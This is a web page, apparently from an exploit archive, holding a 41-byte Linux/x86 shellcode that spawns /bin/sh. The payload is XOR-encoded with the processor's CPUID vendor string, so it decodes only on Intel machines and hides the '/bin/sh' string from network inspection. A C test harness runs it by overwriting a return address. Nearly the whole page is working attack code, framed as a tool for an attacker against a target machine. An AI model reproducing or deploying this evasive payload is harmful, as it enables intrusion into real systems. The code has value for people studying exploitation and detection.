<html><head><title>Linux/x86 - execve /bin/sh xored for Intel x86 CPUID 41 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 * (linux/x86) execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;], NULL) / xor'ed against Intel x86 CPUID - 41 bytes
 *
 * The idea behind this shellcode is to use a *weak* pre-shared secret between the attacker and
 * the attacked machine. So if a 3rd party side would try to run this shellcode and would produce 
 * a different CPUID output (e.g. different arch) the shellcode won't work. In addition this also
 * prevents from having the '/bin/sh' string visible on the wire.
 *
 * The shellcode key is (0x6c65746e, 'letn') and expected to be in %ecx register after CPUID
 * 
 * - izik &lt;izik@tty64.org&gt;
 */

char shellcode[] = 

	&quot;\x31\xc0&quot;              // xor %eax,%eax 
	&quot;\x0f\xa2&quot;              // cpuid 
	&quot;\x51&quot;                  // push %ecx 
	&quot;\x68\xe7\x95\xa8\xec&quot;  // push $0xeca895e7 
	&quot;\x68\xde\x7f\x37\x3f&quot;  // push $0x3f377fde 
	&quot;\x68\x07\x1a\xec\x8f&quot;  // push $0x8fec1a07 
	&quot;\x68\x6e\x1c\x4a\x0e&quot;  // push $0x0e4a1c6e 
	&quot;\x68\x06\x5b\x16\x04&quot;  // push $0x04165b06 

	//
	// &lt;_unpack_loop&gt;:
	//

	&quot;\x31\x0c\x24&quot;          // xor %ecx,(%esp) 
	&quot;\x5a&quot;                  // pop %edx 
	&quot;\x75\xfa&quot;              // jne &lt;_unpack_loop&gt; 
	&quot;\x83\xec\x18&quot;          // sub $0x18,%esp 
	&quot;\x54&quot;                  // push %esp 
	&quot;\xc3&quot;;                 // ret 

int main(int argc, char **argv) {
	int *ret;
	ret = (int *)&amp;ret + 2;
	(*ret) = (int) shellcode;
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
